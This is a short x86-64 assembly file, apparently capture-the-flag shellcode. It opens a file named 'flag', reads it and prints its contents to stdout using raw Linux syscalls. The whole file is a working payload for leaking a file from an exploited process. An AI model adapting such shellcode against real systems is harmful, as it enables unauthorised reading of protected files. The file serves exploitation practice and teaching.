BITS 64
global _start
_start:
mov	qword rbx, 'flag'
push	rbx
mov	rdi, rsp
xor	rsi, rsi
xor	rdx, rdx
mov	rax, sys_open
syscall
mov	rdi, rax
mov	rsi, rsp
mov	rdx, 0xff
mov	rax, sys_read
syscall
mov	rdi, 1
;mov	rsi, rsp
mov	rdx, rax
mov	rax, sys_write
syscall
xor	rdi, rdi
mov	rax, sys_exit
syscall

sys_open  equ 2
sys_read  equ 0
sys_write equ 1
sys_exit  equ 60
